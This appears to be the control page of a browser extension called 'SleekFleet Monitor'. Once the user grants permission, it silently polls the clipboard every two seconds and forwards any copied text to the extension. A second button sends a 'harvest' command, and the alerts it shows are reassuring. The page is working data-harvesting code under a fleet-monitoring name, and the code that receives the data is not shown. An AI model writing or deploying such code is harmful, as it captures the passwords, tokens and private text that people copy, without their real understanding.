<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SleekFleet Control</title>
    <style>
        body { font-family: monospace; padding: 20px; background: #111; color: #0f0; }
        button { padding: 10px; margin: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <h2>🚗 SleekFleet Monitor</h2>
    <button id="enableBtn">📋 Enable Clipboard Monitor</button>
    <button id="harvestBtn">🚀 Trigger Deep Scan</button>

    <script>
        document.getElementById('enableBtn').addEventListener('click', async () => {
            try {
                // This click triggers the browser to ask for permission
                const text = await navigator.clipboard.readText();
                alert("Permission Granted! Monitoring started.");
                
                // Start polling
                setInterval(async () => {
                    try {
                        const text = await navigator.clipboard.readText();
                        if (text) {
                            chrome.runtime.sendMessage({ action: "clipboardUpdate", data: text });
                        }
                    } catch (e) {}
                }, 2000);
            } catch (e) {
                alert("Permission denied or not available.");
            }
        });

        document.getElementById('harvestBtn').addEventListener('click', () => {
            chrome.runtime.sendMessage({ action: "harvest" });
            alert("Deep Scan Sent!");
        });
    </script>
</body>
</html>
